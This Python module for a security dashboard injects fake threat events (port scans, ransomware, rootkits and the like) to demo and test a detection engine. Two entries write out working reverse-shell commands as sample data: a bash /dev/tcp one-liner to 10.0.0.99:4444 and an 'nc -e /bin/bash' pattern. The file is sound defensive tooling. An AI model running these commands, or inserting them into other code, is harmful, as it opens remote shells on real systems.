"""
Cybersecurity - Threat Simulator
Injects realistic fake threats for demo/testing purposes
"""

import asyncio
import random
from datetime import datetime
from models.threat import Threat, ThreatType, ThreatSeverity, ThreatStatus

SIMULATED_THREATS = [
    {
        "type": ThreatType.PORT_SCAN,
        "description": "Aggressive port scan detected from 192.168.1.105 — 67 ports probed in 3 seconds",
        "severity": ThreatSeverity.HIGH,
        "source": "192.168.1.105",
        "module": "NetworkMonitor",
        "metadata": {"ports_scanned": [22, 23, 80, 443, 3306, 5432, 8080], "count": 67}
    },
    {
        "type": ThreatType.BRUTE_FORCE,
        "description": "SSH brute force attack on user 'root' from 45.33.32.156 — 142 attempts in 60s",
        "severity": ThreatSeverity.CRITICAL,
        "source": "45.33.32.156",
        "module": "AuthMonitor",
        "metadata": {"target_user": "root", "attempt_count": 142}
    },
    {
        "type": ThreatType.CRYPTOMINER,
        "description": "XMRig cryptominer process detected (PID 4821) — CPU usage 98%",
        "severity": ThreatSeverity.HIGH,
        "source": "PID:4821",
        "module": "MalwareScanner",
        "metadata": {"process": "xmrig", "cpu_usage": 98}
    },
    {
        "type": ThreatType.RANSOMWARE,
        "description": "Ransomware activity detected — 23 files encrypted with .wnry extension",
        "severity": ThreatSeverity.CRITICAL,
        "source": "/home/user",
        "module": "FileMonitor",
        "metadata": {"encrypted_count": 23, "extension": ".wnry"}
    },
    {
        "type": ThreatType.TROJAN,
        "description": "Reverse shell trojan detected — bash connecting to 10.0.0.99:4444",
        "severity": ThreatSeverity.CRITICAL,
        "source": "PID:3312",
        "module": "MalwareScanner",
        "metadata": {"cmdline": "bash -i >& /dev/tcp/10.0.0.99/4444 0>&1"}
    },
    {
        "type": ThreatType.SPYWARE,
        "description": "Keylogger process 'logkeys' detected — capturing keystrokes",
        "severity": ThreatSeverity.HIGH,
        "source": "PID:2201",
        "module": "MalwareScanner",
        "metadata": {"process": "logkeys"}
    },
    {
        "type": ThreatType.C2_TRAFFIC,
        "description": "Outbound C2 traffic to known botnet server 185.220.101.34:8443",
        "severity": ThreatSeverity.CRITICAL,
        "source": "185.220.101.34",
        "module": "NetworkMonitor",
        "metadata": {"remote_port": 8443, "protocol": "TCP"}
    },
    {
        "type": ThreatType.MALICIOUS_SCRIPT,
        "description": "Malicious bash script in /tmp — contains reverse shell payload",
        "severity": ThreatSeverity.HIGH,
        "source": "/tmp/update.sh",
        "module": "FileMonitor",
        "metadata": {"pattern": "nc -e /bin/bash", "path": "/tmp/update.sh"}
    },
    {
        "type": ThreatType.DNS_HIJACK,
        "description": "DNS hijack: google.com resolves to 10.10.10.1 instead of 142.250.80.46",
        "severity": ThreatSeverity.CRITICAL,
        "source": "10.10.10.1",
        "module": "NetworkMonitor",
        "metadata": {"domain": "google.com", "expected": "142.250.80.46", "resolved": "10.10.10.1"}
    },
    {
        "type": ThreatType.ROOTKIT,
        "description": "Rootkit indicator: 7 hidden processes found in /proc not visible in ps",
        "severity": ThreatSeverity.CRITICAL,
        "source": "kernel",
        "module": "MalwareScanner",
        "metadata": {"hidden_pids": ["1337", "1338", "1339", "1340", "1341", "1342", "1343"]}
    },
    {
        "type": ThreatType.WORM,
        "description": "Network worm spreading via SMB — lateral movement detected to 10.0.0.x subnet",
        "severity": ThreatSeverity.CRITICAL,
        "source": "10.0.0.0/24",
        "module": "NetworkMonitor",
        "metadata": {"protocol": "SMB", "subnet": "10.0.0.0/24"}
    },
    {
        "type": ThreatType.PRIVILEGE_ESC,
        "description": "Unexpected SUID binary found: /tmp/.hidden/escalate",
        "severity": ThreatSeverity.HIGH,
        "source": "/tmp/.hidden/escalate",
        "module": "AuthMonitor",
        "metadata": {"file": "/tmp/.hidden/escalate", "permission": "SUID"}
    },
]


async def simulate_attack_wave(engine, count: int = 3, delay: float = 2.0):
    """Simulate a wave of threats for demo purposes"""
    threats_to_simulate = random.sample(SIMULATED_THREATS, min(count, len(SIMULATED_THREATS)))
    for threat_data in threats_to_simulate:
        threat = Threat(**threat_data)
        await engine.register_threat(threat)
        await asyncio.sleep(delay)
        # Auto-respond after a short delay
        await asyncio.sleep(1.5)
        await engine.auto_respond(threat)


if __name__ == "__main__":
    print("🎯 Cybersecurity Threat Simulator")
    print("Run this module from the main app context")
    print("Available threats:", len(SIMULATED_THREATS))
    for t in SIMULATED_THREATS:
        print(f"  [{t['severity'].upper()}] {t['type']}: {t['description'][:60]}...")
